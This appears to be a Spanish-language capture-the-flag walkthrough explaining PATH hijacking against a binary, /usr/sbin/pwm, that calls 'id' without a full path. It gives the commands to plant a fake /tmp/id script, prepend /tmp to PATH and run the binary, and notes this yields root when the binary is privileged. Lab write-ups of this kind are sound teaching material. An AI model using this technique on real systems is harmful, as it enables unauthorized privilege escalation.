🔹 Paso 1: Crear un script falso llamado id
echo '#!/bin/bash' > /tmp/id


Esto crea un archivo vacío en /tmp/id y le pone como primera línea:

#!/bin/bash


Esto indica que ese archivo es un script de Bash.

echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id


Esto añade una línea al script que imprimirá este texto falso:

uid=33(think) gid=33(think) groups=(think)


Este mensaje imita lo que normalmente imprime el comando id, pero tú lo controlas.

🔹 Paso 2: Hacerlo ejecutable
chmod +x /tmp/id


Esto le da permisos de ejecución a tu archivo, para que se pueda ejecutar como un programa.

🔹 Paso 3: Modificar la variable de entorno $PATH
export PATH=/tmp:$PATH


La variable $PATH es una lista de carpetas donde el sistema busca los comandos que ejecutas (como ls, id, cat, etc).

Al hacer esto, le dices al sistema:

“Cuando ejecutes cualquier comando, primero busca en /tmp, y luego en el resto de rutas.”

🔹 Paso 4: Ejecutar el binario vulnerable
/usr/sbin/pwm


Este binario (ya compilado por otro, tú no lo hiciste) internamente ejecuta el comando id para ver quién es el usuario actual.
Pero NO usa la ruta completa (/usr/bin/id), simplemente ejecuta:

id


Como tú ya cambiaste el $PATH, el sistema encuentra primero tu archivo falso /tmp/id y lo ejecuta.

🧪 Resultado:
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think


Este mensaje no lo genera el sistema real, lo genera tu script falso.

Después de eso, el binario pwm sigue ejecutándose y muestra datos reales que no tienen que ver con tu script (como los nombres jose1006, jose1001teles, etc.).

🧠 ¿Por qué esto es importante?

Si un programa se ejecuta con permisos elevados (por ejemplo, como root) y tú puedes manipular el PATH, podrías ejecutar un script que te dé acceso de root.

Esto es una técnica clásica de escalada de privilegios.
